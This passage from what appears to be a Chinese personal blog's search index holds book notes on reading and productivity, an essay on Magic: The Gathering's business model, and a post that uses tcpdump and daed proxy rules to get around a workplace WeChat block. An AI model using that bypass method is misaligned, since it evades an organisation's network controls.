这些技巧能够帮助读者更好地提升自己的理解力和知识吸收的速度, 并且有针对性地运用有限的精力.\u003c/p\u003e\n\u003cp\u003e本书并不谈论以消遣为目的的阅读活动, 也不会谈论单纯以获取资讯为目的的阅读活动, 尽管在提升理解力后, 获取资讯会更加迅速.\u003c/p\u003e\n\u003ch2 id=\"四个层次的阅读\"\u003e四个层次的阅读\u003c/h2\u003e\n\u003cp\u003e阅读的四个层次, 这几个层次是相互包含, 层层递进的:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e基础阅读\u003c/strong\u003e: 熟悉理解并掌握词语和句子的意思\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e检视阅读\u003c/strong\u003e: 在规定时间内从宏观层面上理解书中的重点, 从而判断值不值得读\n\u003col\u003e\n\u003cli\u003e系统性略读\n\u003col\u003e\n\u003cli\u003e阅读书名 序言 目录\u003c/li\u003e\n\u003cli\u003e从目录中挑几个与主题相关的篇章, 仔细阅读开头和结尾处的摘要说明\u003c/li\u003e\n\u003cli\u003e随便翻翻全书, 随时寻找主要论点, 不要忽略最后的两三页\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e粗浅阅读\n\u003col\u003e\n\u003cli\u003e从头到尾先读完一遍, 碰到不懂的地方不要停下来查询或思考, 只注意你能理解的地方, 不要为了一些没能立刻理解的地方而停顿, 这样就不会拘泥于局部\u003c/li\u003e\n\u003cli\u003e克服在🧠大脑中念出声的阅读方式, 头脑和眼睛不一样, 并不需要一次只\u0026quot;读\u0026quot;一个字或者句子 =\u0026gt; 利用手指在书页上的移动来引导眼睛和大脑\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e分析阅读\u003c/strong\u003e: 全盘完整的阅读 (不完全适用于小说和诗集)\n\u003col\u003e\n\u003cli\u003e阶段一\n\u003col\u003e\n\u003cli\u003e为书籍分类(小说?爱情小说?论说类?经济学?历史?哲学?) =\u0026gt; 什么类型的房子\u003c/li\u003e\n\u003cli\u003e用几句话叙述整本书的内容 =\u0026gt; 房子的整体功能(整体性)\u003c/li\u003e\n\u003cli\u003e将重要篇章列举出来, 说明它们如何形成了整体 =\u0026gt; 砖瓦的功能和联系(复杂性)\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e阶段二\n\u003col\u003e\n\u003cli\u003e找出关键字, 确认每个字不同意义之间的转换, 与作者找出共通的语义\u003c/li\u003e\n\u003cli\u003e重新架构作者论述的前因后果\u003c/li\u003e\n\u003cli\u003e确定作者解决了什么问题, 还有哪些问题没有解决\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e阶段三: 对书本下评论\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e主题阅读\u003c/strong\u003e: 面对一本书时去阅读许多同类型的其他书籍, 并相互对比\n\u003col\u003e\n\u003cli\u003e针对主题设计实验性书目, 找出并确定相关的书籍\u003c/li\u003e\n\u003cli\u003e阅读这些书籍的相关章节\u003c/li\u003e\n\u003cli\u003e建立中立的主旨和词汇, 列出一连串相关的问题\u003c/li\u003e\n\u003cli\u003e界定每个作者研究的主要和次要议题\u003c/li\u003e\n\u003cli\u003e分析这些讨论。这得把问题和议题按顺序排列，以求突显主题\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e所谓阅读速度, 不只是要能读得快, 还要能用不同的速度来阅读, 要知道什么时候用什么速度是恰当的.\u003c/p\u003e","title":"《如何阅读一本书》读书笔记"},{"content":"这本书主要讨论了如何在工作过程中保持愉悦的心态, 进而提升工作效率, 保护精神健康. 作者认为愉悦心态可以帮助克服焦虑和过度的压力, 成功不会让你感觉愉悦, 但是感觉愉悦会为你带来成功.\n本书内容分为三个部分: 激励(让工作更有兴致) 解锁(消除面对工作时的负面情绪) 续航(通过良好的习惯克服倦怠感)\n激励 游戏化思维 有趣的游戏化体验会带来愉悦\n选择一个游戏性格, 找出最能与你产生共鸣的游戏状态, 并有意识的把自己当作这个角色来对待工作, 代入一场冒险\n收藏家：喜欢收集和整理物品，喜欢寻找珍稀植物、拍卖档案馆或车库中的珍宝等活动。 竞争者：喜欢游戏和体育赛事，以全力以赴和获胜为乐。 探索者：喜欢徒步旅行、公路旅行和其他探索活动，喜欢行走和发现新的地方和从未见过的事物。 创造者：在创造中找到快乐，每天可以花几个小时涂鸭、绘画、制作音乐、园艺等。 讲故事的人：想象力丰富，能用自己的想象力取悦他人。他们喜欢写作、舞蹈、戏剧和角色扮演。 小丑：努力逗人发笑，可能会通过倒立、即兴表演或恶作剧逗你发笑。 导演：喜欢策划、组织和领导他人，能胜任各种角色和活动，从导演舞台剧到管理公司，再到参与政治或社会运动。 动觉型： 在杂技、体操和自由跑等体育活动中找到乐趣。 善于运用好奇的力量, 当被问到让人好奇的问题的时候, 大脑会开始分泌多巴胺, 更让人专注\n工作时候多问问自己问题 每天除了日常任务之外给自己增加一个让人好奇的支线任务: 探索新的软件 学习新的编程语言 学习新的模型, 给玩心创造空间 多问问自己, 怎么样能让这个任务变得更加有趣? 要更加专注于任务过程带来的乐趣, 而不是结果.\n压力会降低游戏的能力, 也会降低生产力, 这意味着为了激发玩心, 我们不只需要追求冒险和寻找乐趣, 还需要努力创造一个低风险能让人放松的环境\n学习黑暗之魂的思路去看待失败, 将失败看作是冒险中不可分割的一部分, 是尝试新事物的实验, 是成功路上的必经之路, 是隐形的进步\n多提醒提醒自己, 不要过于严肃, 而是真诚以对\n好比玩一场大富翁游戏, 无所谓的心态自然无法玩好, 过于严肃对得失斤斤计较则无论过程是否顺利都体会不到乐趣, 只有真诚对待游戏, 全心投入每一个过程却又不计较得失, 才能开怀大笑. (很重要)\n自我赋权 自信心会给工作过程带来快乐, 让人表现更好\n对于人类的表现和福祉而言, 重要的不只是我们的能力, 而使我们对自身能力的感受\n自信并非与生俱来, 而使透过学习获得\n你说的话往往会成为你相信的真理, 当你听到\u0026quot;你能办到\u0026quot;, \u0026ldquo;就快成功了\u0026quot;等微小鼓励, 就足以对自信水平发生影响, 更重要的是, 自己可以向自己传达正面讯息.\n多问问自己: 如果很有信心做好这件事, 会是什么样子?\n找到和你经历同样挑战的人, 与他们共度时光, 听听他们的故事, 沉浸在成功的替代经验, 就能给自己带来强烈暗示: 如果他们办得到, 你也可以\n从做中学, 做的越多, 自信心越强\n时刻保有初学者心态, 不要被过去的经验所束缚, 用开放的心态思考极限和错误. 提醒自己\u0026quot;大师\u0026quot;会受限于他们的理念, 前方依旧有无限的可能\n扮演老师的角色, 指导别人的同时可以迫使自己深入思考问题\n当人们感到对自己的行为具备所有权时, 他们就更有可能受到内在动机的驱使而投身其中.\n当人们并不觉得自己完全主导一项任务, 例如仅仅只是为了获取外部奖励从事任务, 那么对自我的掌控感就会下降, 动机也跟着降低. 其他的例子如: 我不喜欢我住的地方, 但我没有能力搬走;我不喜欢这段关系,但我无力改变;我觉得工作无聊,但我没有能力改变.\n有时的确无法改变现状, 但是很多时候, 人比自己意识到的更有能力, 至少能够掌控部分局势.因此可以多提醒提醒自己, 去关注自己能够控制的部分, 即便不能选择做什么, 仍然可以选择如何做.\n当无法选择时, 告诉自己: \u0026ldquo;我选择做这件事\u0026rdquo;, \u0026ldquo;我获得资格做这件事\u0026rdquo;, \u0026ldquo;我有幸这么做\u0026rdquo;\n你可以从一个人身上夺走一切, 除了一样东西. 那是人类最后的自由, 也就是在任何情形下, 选择自己的心态, 选择自己个人的方式.\n掌控关系能量 与优秀的人互动可以振奋精神\n将竞争转化为同袍关系, 并且团队合作不仅是一种行为方式, 更是一种可以自我暗示的心态\n相信自己是某个团队的一员, 要有意识的把你身边同样在努力的人想成你团队中的一员, 并想办法将竞争心理转变为双赢心理\n同步性能够带来团队感, 比如尽管在做不同的事情, 但与他人一起工作对专注力有很大的帮助, 也带来快乐, 前提是消灭竞争心理.\n帮助他人, 或者寻求他人的帮助, 双方必定会有人产生良好的感觉, 大脑会分泌催产素等带来快乐的激素\n以正确的方式提出请求, 尽量当面, 间接的方式会增加难度 避免使用消极言辞, 也避免将请求他人的帮助变成一种交易, 强调为什么要向这个特定的人求助的正面理由 好消息要过度沟通, 对于如何回应他人的好消息, 需要有主动的建设性回应, 这会让双方的关系更加稳固\n好消息: 我工作被录取了 主动建设性回应: 太棒了, 你为此付出了很多努力, 我就知道你会成功 被动建设回应: 牛\n解锁 三种克服拖延症的方法:\n激励自己去做 -\u0026gt; 如何让自己想做 用纪律让自己无论如何都要做 -\u0026gt; 如何克服 弄清楚自己的痛苦, 疏通它 -\u0026gt; 是什么阻碍了我 建立确定事项 不确定性会让人感觉很糟, 不想去面对, 就好像没人想在大雾天骑自行车一样.\n探索目标: 对计划的执着可能会成为阻碍, 搞不清最终的目的是什么. 所以在制订计划前多问问自己计划背后的目的是什么.\n设置量化目标可能会阻碍生产力, 如果太执著一个目标, 就会忽视过程带来的乐趣\n我偏爱的方法从不会绑定某个外部结果或者目的, 而是注重在通往目标的旅程中, 我们必须感觉愉悦:\n短期: 短期目标确保专注于眼前需要的步骤 输入为本: 强调过程而不是抽象的最终结果, 例如: 在放下手机的情况下工作若干小时 可控制: 专注于控制范围内的目标, 也就是目标具备可行性 激发活力: 将游戏等因素加入到目标中 水晶球法: 事先在脑海中问自己, 未来什么原因可能会造成拖延? 能做些什么来削弱这些原因? 可以请谁来协助自己克服拖延? 现在可以采取什么活动来帮助未来的自己?\n将自己想要培养的习惯融入日常的其他习惯中, 使用\u0026quot;如果x发生, 那么我就做y\u0026quot;来暗示自己 -\u0026gt; 起床时练习冥想\n打散恐惧 缺乏天赋和灵感不会阻碍你, 恐惧才会\n将自身的感受用语言表达出来, 能够让理性发挥作用, 增强自我意识, 因此多问问自己: 我在害怕什么?\n有意识地去掉自己身上的负面标签, 换上正面标签, 改变标签往往能改变行为\n避免将挫折的影响扩大化, 提醒自己, 这些糟糕的影响在未来并不重要\n可以问问自己三个问题:\n十分钟后这件事重要吗 十周后这件事重要吗 十年后这件事重要吗 停止聚焦在自己身上, 没那么多人在乎你, 你没有那么重要\n蝙蝠侠效应: 把自己想象成超级英雄或者其他角色时, 能够展现出更好的自我控制力专注力甚至纪律\n解构惯性 牛顿第一定理也适用于描述人类行为: 开始行动所需要的能量远大于保持行动的能量\n阻碍行动的摩擦力就存在于环境之中, 因此需要调整环境中的预设项, 将重要的东西放在显眼的位置, 保持环境整洁, 关闭手机\n想着只需要做五分钟就好, 等时间到了再决定是否休息\n多问问自己, 下一步具体的行动是什么? 为自己描述一个最小可行计划\n追踪进度, 用量化的方式激励自己\n找一个志同道合的伙伴监督自己\n自己没能做到的时候, 不要专注于失败, 要原谅而不是苛责自己, 并为自己做到的小小胜利而庆祝\n续航 倦怠是一种职业现象, 特征是: 感觉能量耗尽或精疲力竭;与工作的心理距离拉大,或对工作感到消极负面或者愤世嫉俗;以及同时伴随着专业效能降低. 最重要的, 它与工作时间长短无关, 而是与工作的感受有关.\n三种常见的倦怠:\n疲劳倦怠: 来自过多的工作 消耗性倦怠: 来自错误的休息方式 错位倦怠: 将精力投入到错误的地方 更省力的活法: 拒绝琐事, 抵抗分心, 增加休息时间\n频繁转换注意力会产生大量的精力开销, 可以用以下方法:\n让手机变得难用或者隔绝手机 摆脱放弃型失败, 安慰自己可以重新开始, 聊胜于无 \u0026ldquo;我已经浪费了5分钟, 不如把接下来的三个小时都浪费了吧\u0026rdquo; \u0026ldquo;我少学习了一天, 干脆放弃学习吧\u0026rdquo; 有些分心能够帮助人们休息, 例如陪伴, 提醒人们为快乐暂停片刻\n三种为自己充电的方法:\n创意型的活动, 学习新技能, 画画, 运动等等 效能感 自主性 解放感 放松感 拥抱自然 听自然的声音也有效果 放空心灵 就是把\u0026quot;什么都不做\u0026quot;的时间融入生活, 例如在做事情的时候不用耳机听任何东西, 给大脑减负 允许自己放松一天, 并刻意远离任何事情, 什么都不要做, 什么都不要看, 什么都不要听 ","permalink":"https://ch3n9w.github.io/posts/read-feel-good-productivity/","summary":"\u003cp\u003e这本书主要讨论了如何在工作过程中保持愉悦的心态, 进而提升工作效率, 保护精神健康. 作者认为愉悦心态可以帮助克服焦虑和过度的压力, 成功不会让你感觉愉悦, 但是感觉愉悦会为你带来成功.\u003c/p\u003e\n\u003cp\u003e本书内容分为三个部分: 激励(让工作更有兴致) 解锁(消除面对工作时的负面情绪) 续航(通过良好的习惯克服倦怠感)\u003c/p\u003e\n\u003ch2 id=\"激励\"\u003e激励\u003c/h2\u003e\n\u003ch3 id=\"游戏化思维\"\u003e游戏化思维\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e有趣的游戏化体验会带来愉悦\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e选择一个游戏性格, 找出最能与你产生共鸣的游戏状态, 并有意识的把自己当作这个角色来对待工作, 代入一场冒险\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e收藏家：喜欢收集和整理物品，喜欢寻找珍稀植物、拍卖档案馆或车库中的珍宝等活动。\u003c/li\u003e\n\u003cli\u003e竞争者：喜欢游戏和体育赛事，以全力以赴和获胜为乐。\u003c/li\u003e\n\u003cli\u003e探索者：喜欢徒步旅行、公路旅行和其他探索活动，喜欢行走和发现新的地方和从未见过的事物。\u003c/li\u003e\n\u003cli\u003e创造者：在创造中找到快乐，每天可以花几个小时涂鸭、绘画、制作音乐、园艺等。\u003c/li\u003e\n\u003cli\u003e讲故事的人：想象力丰富，能用自己的想象力取悦他人。他们喜欢写作、舞蹈、戏剧和角色扮演。\u003c/li\u003e\n\u003cli\u003e小丑：努力逗人发笑，可能会通过倒立、即兴表演或恶作剧逗你发笑。\u003c/li\u003e\n\u003cli\u003e导演：喜欢策划、组织和领导他人，能胜任各种角色和活动，从导演舞台剧到管理公司，再到参与政治或社会运动。\u003c/li\u003e\n\u003cli\u003e动觉型： 在杂技、体操和自由跑等体育活动中找到乐趣。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e善于运用好奇的力量, 当被问到让人好奇的问题的时候, 大脑会开始分泌多巴胺, 更让人专注\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e工作时候多问问自己问题\u003c/li\u003e\n\u003cli\u003e每天除了日常任务之外给自己增加一个让人好奇的支线任务: 探索新的软件 学习新的编程语言 学习新的模型, 给玩心创造空间\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e多问问自己, 怎么样能让这个任务变得更加有趣? 要更加专注于任务过程带来的乐趣, 而不是结果.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e压力会降低游戏的能力, 也会降低生产力, 这意味着为了激发玩心, 我们不只需要追求冒险和寻找乐趣, 还需要努力创造一个低风险能让人放松的环境\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e学习黑暗之魂的思路去看待失败, 将失败看作是冒险中不可分割的一部分, 是尝试新事物的实验, 是成功路上的必经之路, 是隐形的进步\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e多提醒提醒自己, 不要过于严肃, 而是真诚以对\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e好比玩一场大富翁游戏, 无所谓的心态自然无法玩好, 过于严肃对得失斤斤计较则无论过程是否顺利都体会不到乐趣, 只有真诚对待游戏, 全心投入每一个过程却又不计较得失, 才能开怀大笑. (很重要)\u003c/p\u003e\n\u003ch3 id=\"自我赋权\"\u003e自我赋权\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e自信心会给工作过程带来快乐, 让人表现更好\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e对于人类的表现和福祉而言, 重要的不只是我们的能力, 而使我们对自身能力的感受\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e自信并非与生俱来, 而使透过学习获得\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e你说的话往往会成为你相信的真理, 当你听到\u0026quot;你能办到\u0026quot;, \u0026ldquo;就快成功了\u0026quot;等微小鼓励, 就足以对自信水平发生影响, 更重要的是, 自己可以向自己传达正面讯息.\u003c/p\u003e","title":"《高效原力》读书笔记"},{"content":"目前单位实施了微信封锁,本文旨在记录绕过封锁的过程.\n阶段一: 抓域名 使用了tcpdump抓取各个dns请求, 来获取需要代理的域名列表\nsudo tcpdump -i any -n -s 0 port 53 但是抓到域名后加入daed的代理列表中还是无法登陆,怀疑是没抓全.\n阶段二: 进程代理 既然抓不全, 那么就对整个微信的进程进行流量代理吧, 在daed中添加规则:\npname(WeChatAppEx) -\u0026gt; proxy pname(wechat) -\u0026gt; proxy 这下登陆和发文字消息都正常了, 但是图片的发送和接收有极其严重的延迟, 应该是走了代理导致的.\n阶段三: 仅代理登陆相关域名 经过几次实验, 发送单位对微信的封禁主要有两方面:\n登陆相关的流量封禁 微信公众号图片相关的流量封禁 那么在搜索到相关域名列表之后,将对应的域名添加到daed规则中,其他的流量不作处理使用直连.\ndomain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -\u0026gt; proxy 重新加载规则, 一切正常.\n","permalink":"https://ch3n9w.github.io/posts/tech-wechat-proxy/","summary":"\u003cp\u003e目前单位实施了微信封锁,本文旨在记录绕过封锁的过程.\u003c/p\u003e\n\u003ch2 id=\"阶段一-抓域名\"\u003e阶段一: 抓域名\u003c/h2\u003e\n\u003cp\u003e使用了\u003ccode\u003etcpdump\u003c/code\u003e抓取各个dns请求, 来获取需要代理的域名列表\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tcpdump -i any -n -s \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e port \u003cspan style=\"color:#ae81ff\"\u003e53\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e但是抓到域名后加入daed的代理列表中还是无法登陆,怀疑是没抓全.\u003c/p\u003e\n\u003ch2 id=\"阶段二-进程代理\"\u003e阶段二: 进程代理\u003c/h2\u003e\n\u003cp\u003e既然抓不全, 那么就对整个微信的进程进行流量代理吧, 在daed中添加规则:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epname(WeChatAppEx) -\u0026gt; proxy\npname(wechat) -\u0026gt; proxy\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这下登陆和发文字消息都正常了, 但是图片的发送和接收有极其严重的延迟, 应该是走了代理导致的.\u003c/p\u003e\n\u003ch2 id=\"阶段三-仅代理登陆相关域名\"\u003e阶段三: 仅代理登陆相关域名\u003c/h2\u003e\n\u003cp\u003e经过几次实验, 发送单位对微信的封禁主要有两方面:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e登陆相关的流量封禁\u003c/li\u003e\n\u003cli\u003e微信公众号图片相关的流量封禁\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e那么在搜索到\u003ca href=\"https://www.fdeer.com/4817.html\"\u003e相关域名列表\u003c/a\u003e之后,将对应的域名添加到daed规则中,其他的流量不作处理使用直连.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edomain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -\u0026gt; proxy\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重新加载规则, 一切正常.\u003c/p\u003e","title":"特殊网络环境下的微信代理"},{"content":"这几天被万智牌所吸引, 富有史诗感的画风, 复杂但不混乱的规则, 简洁的卡面语言, 丰富的卡片种类, 多样性的玩法\u0026hellip;\u0026hellip;这些都是我在游戏王中所接触不到但怀念许久的, 在接触万智牌之前,这种怀念源自于过去的炉石传说,而在了解到万智牌后才发现,这些特质其实是万智牌所创造而让炉石继承下来的, 再加上略倾向于黑暗史诗的画风, 万智牌在很多维度上都比过去接触过的所有卡牌游戏更戳我的xp.\n当然, 它并不是没有缺点的, 虽然主要的几个缺点都不是卡牌本身带来的.\n最大的缺点其实在于威世智的运营太垃圾了 缺乏推广, 国内的推广力度相比较宝可梦来说几乎为0, 我目前能看到的最近的一次推广还是在2021年, 找的甚至还是半佛而不是正儿八经的明星 官方对民间赛事的抵制态度让\u0026quot;积极组织-\u0026gt;积极阻止\u0026quot;成为大陆万智牌玩家口口相传的黑历史, 失去了民心 取消中文线不仅妨碍的新人入坑, 也让老玩家对买卡的投资价值产生了怀疑, 继而推动这两类人去投资其他发展更有前景的卡牌 万智牌的定价, 四美元十五抽的全球统一定价在三十年的万智牌历史中就没有变过, 可即便在消费水平远胜过去的现在, 这个价格在大部分人, 尤其是圈外玩家看来依旧偏高, 再加上至少60牌的构筑体量和二级市场交易, 让成型万智套牌的价格普遍在500+, 与之形成鲜明对比的, 是宝可梦和游戏王等TCG后辈们更加亲民的价格, 让万智牌显得像是一个跟不上时代的老人. 当然了, 就我个人而言, 万智牌的设计感值得让它的价格比别的卡牌贵, 虽然我不会买 背景故事质量不高. 人类是一个以讲故事起家的物种, 人类社会也是在金钱政治国家宗教等种种抽象故事基础上建立起来的, 可以说没有故事就没有社群. 万智牌不是没有故事, 而是它的故事太过单薄且没有吸引人的地方, 在这个故事遍地走的年代, 随便一本主流的冒险小说都可以拉出来吊打它, 而不够精彩的故事就注定无法吸引注重故事的人 缺乏故事的传播媒介. 客观来说, 游戏王和宝可梦的背景故事放在现在来看同样水平一般, 假如大家的故事形式都只是小说, 我相信万智牌在讲故事这方面或许还有一战之力, 但是游戏王和宝可梦有了动画, 竞争的维度就变得不一样了, 在处理得当的情况下, 视频影像会大幅度提高一个故事情感渲染的上下限, 即便剧情再怎么糟糕, 人们也会因为那么几个印象深刻的画面而记住这个IP, 随着时间的推移, 动画带来的传播效应会呈现滚雪球式的增加: 老玩家会因为获得滤镜加持, 新玩家同样可以轻松因为画面而发生共情. 剩下的涉及卡牌平衡性的缺点, 这也引发了我对众多TCG游戏的思考, 包括游戏整体的生命周期以及TCG游戏的意义.\n生命周期 实体苦厄 纵观众多TCG, 万智牌受限于底层费用机制似乎在这方面相对来说做得好一些, 然而问题在于, 作为一个商业产品, 它的第一任务是给公司带来财富, 第二任务才是服务于玩家, 尽管二者在有些时候, 尤其是游戏发展的早期是不冲突的. 从玩家来说, 游戏本体的运营发展存在两个方向, 一是玩法的扩张, 二是强度的迭代, 前者更灵巧更得人心, 后者则由于对已有卡牌的淘汰而常常备受争议. 一般来说, 有经验的卡牌运营商并不着急于强度迭代, 而是优先致力于玩法的扩张, 间或夹杂必要的强度提升, 可惜的是, 近乎固化的底层规则框架决定了玩法的扩张是有边际效应的, 当扩张玩法的边际效应变得越来越低时, 说明TCG的生命周期已经步入了后半段, 然而这与商业产品的第一使命相互冲突, 随之而来的是强度的无限扩张和争议的发生, 在没有新玩法的情况下, 可以预见的是无止境的强度爆炸. 在这点上, 所有商业TCG都面临着同样的问题: 有限的卡牌玩法和无限的公司贪欲与玩家需求引发的主要矛盾.\n当然, 就我有限的了解来看, 万智牌这两年依旧在进行着大大小小的机制创新, 然而看起来, 强度爆炸是每个TCG不可避免的结局, 这是每一个圈内玩家都不愿意看到的结果. 那么有没有什么办法打破这个僵局呢? 有的, 只要矛盾的三方有一方死去, 僵局就会不成立\n无限扩展卡牌的玩法与规则. 按照前文所提, 玩法的扩张能够缓和TCG的主要矛盾, 在玩法存在无限可能的情况下, 矛盾能够被稀释至不存在. 然而基本没有实体游戏能够做到这点, 为什么说实体游戏, 后面会讲到. 公司的死亡. 这是一个很难但是有可能发生的情况, 在这种情况下, 卡牌环境将会得到永久性的固化, 玩家们将会从现有的卡片中建立新的平衡, 包括不同的赛制和禁卡表, 各种套牌的强度分级. 玩家需求不再扩张, 不再对强度和玩法抱有更高的要求, 这不可能. 就我个人来说, 第二种可能是我所期望发生的, 即便这会带来一系列严重问题\n终结商业链上的各个上下游的生命, 对于去牌店的相关玩家来说, 直观的体验不仅是买不到对应卡牌, 更有可能会因为牌店的商业考虑而被驱逐. 不过以我个人的体验来看, 去牌店遇到有趣之人的概率太低了, 我宁可和朋友线上视频玩 部分玩家会因为环境固化而退坑, 毕竟人是喜新厌旧的动物, 这种天性促成我们进行冒险和出轨, 然而就万智牌来说, 终究会有大批玩家留存, 因为它实在是太特别了. 官方停止印刷后, 卡牌的来源成为严重问题, 这点我并不担心, 相关打印行业和民间组织将会随着官方公司的死亡而兴起. 死亡带来新生.\n电子飞升 炉石传说是一个很特别的卡牌游戏, 由于没有实体, 它缺乏集换的属性, 并不属于TCG, 而这种全面电子化带来的好处是显而易见的: 无需顾虑实体卡牌, 可以用程序去实现那些线下卡牌达成不了的效果, 例如在全部的传说随从中随机摇出一个, 也能实现线下卡牌受限于物理环境无法实现的机制, 这大大拓展了卡牌游戏的可能性.\n当然, 坏处也有, 第一, 玩家无法捏着喜欢的实体卡牌进行战斗, 相信我, 捏着卡打的感觉和线上点点鼠标的感觉很不一样, 这是电子游戏无法替代的一点; 第二, 所有数据归背后的公司所有, 卡牌无法脱离公司存在, 当然, 玩一天是一天是很多人的想法, 暴雪离开中国的那段时间也并没有怎么样, 可以玩的游戏一抓一大把.\n意义和鄙视链 棋牌策略类游戏作为众多游戏中对智力水平要求最高的游戏, 其游玩过程非常强调个人思考, 在这样一个崇尚智力的时代, 此类游戏无疑在许多玩家心中享有几分尊贵地位, 而卡牌类游戏, 尤其是TCG, 由于独特的理念, 更是为许多玩家所津津乐道. 与所有游戏一样, TCG也要被放在鄙视链上好好评价一番, TCG内部也存在基于难度和设计质量而诞生的鄙视链, 不过这里就存在着一个有意思的问题: 门槛越高越复杂的游戏真的越好吗?\n这是一个很有意思的问题, 推广开来, 基于难度和智力挑战或者游戏技术力的鄙视链存在已久, 徘徊在许多玩家的心里, 个别极端者甚至会以此为圭臬成为类似宗教的组织并对其他游戏玩家大加讨伐, 希望其他游戏\u0026quot;消失\u0026quot;, 让鄙视链上自己认可的游戏给大家带来自己认可的挑战和难度考验.\n然而这种鄙视是可笑的, 如果追求难度和挑战, 那么就不该玩游戏, 无论编程还是运动, 哪一个难度不比现有的任何游戏都困难? 如果追求极致的困难, 那么现在就应该放下游戏, 去学习你最不想学的功课, 去经营好你那惨淡不堪的人生.\n说穿了, 玩游戏玩来玩去, 玩的就是一个快乐, 谁也别瞧不起谁.\n最后的最后 说了这么多, 但是这些都不重要, 无论游戏机制还是画风, 宝可梦和游戏王都不是万智牌的对手, 游戏王的机制和独家k语言更是无比扭曲的产物, 然而人家依旧活得好好的, 说明我们人类对于卡牌桌游设计的容忍区间还是挺大的. 不过我想更有可能的是, 有的时候, 我们更在乎的坐在对面一起玩的人, 毕竟有人才是玩游戏最大的需求啊.\n","permalink":"https://ch3n9w.github.io/posts/gossip-tcg/","summary":"\u003cp\u003e这几天被万智牌所吸引, 富有史诗感的画风, 复杂但不混乱的规则, 简洁的卡面语言, 丰富的卡片种类, 多样性的玩法\u0026hellip;\u0026hellip;这些都是我在游戏王中所接触不到但怀念许久的, 在接触万智牌之前,这种怀念源自于过去的炉石传说,而在了解到万智牌后才发现,这些特质其实是万智牌所创造而让炉石继承下来的, 再加上略倾向于黑暗史诗的画风, 万智牌在很多维度上都比过去接触过的所有卡牌游戏更戳我的xp.\u003c/p\u003e\n\u003cp\u003e当然, 它并不是没有缺点的, 虽然主要的几个缺点都不是卡牌本身带来的.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e最大的缺点其实在于威世智的运营太垃圾了\n\u003cul\u003e\n\u003cli\u003e缺乏推广, 国内的推广力度相比较宝可梦来说几乎为0, 我目前能看到的最近的一次推广还是在2021年, 找的甚至还是半佛而不是正儿八经的明星\u003c/li\u003e\n\u003cli\u003e官方对民间赛事的抵制态度让\u0026quot;积极组织-\u0026gt;积极阻止\u0026quot;成为大陆万智牌玩家口口相传的黑历史, 失去了民心\u003c/li\u003e\n\u003cli\u003e取消中文线不仅妨碍的新人入坑, 也让老玩家对买卡的投资价值产生了怀疑, 继而推动这两类人去投资其他发展更有前景的卡牌\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e万智牌的定价, 四美元十五抽的全球统一定价在三十年的万智牌历史中就没有变过, 可即便在消费水平远胜过去的现在, 这个价格在大部分人, 尤其是圈外玩家看来依旧偏高, 再加上至少60牌的构筑体量和二级市场交易, 让成型万智套牌的价格普遍在500+, 与之形成鲜明对比的, 是宝可梦和游戏王等TCG后辈们更加亲民的价格, 让万智牌显得像是一个跟不上时代的老人. 当然了, 就我个人而言, 万智牌的设计感值得让它的价格比别的卡牌贵, 虽然我不会买\u003c/li\u003e\n\u003cli\u003e背景故事质量不高. 人类是一个以讲故事起家的物种, 人类社会也是在金钱政治国家宗教等种种抽象故事基础上建立起来的, 可以说没有故事就没有社群. 万智牌不是没有故事, 而是它的故事太过单薄且没有吸引人的地方, 在这个故事遍地走的年代, 随便一本主流的冒险小说都可以拉出来吊打它, 而不够精彩的故事就注定无法吸引注重故事的人\u003c/li\u003e\n\u003cli\u003e缺乏故事的传播媒介. 客观来说, 游戏王和宝可梦的背景故事放在现在来看同样水平一般, 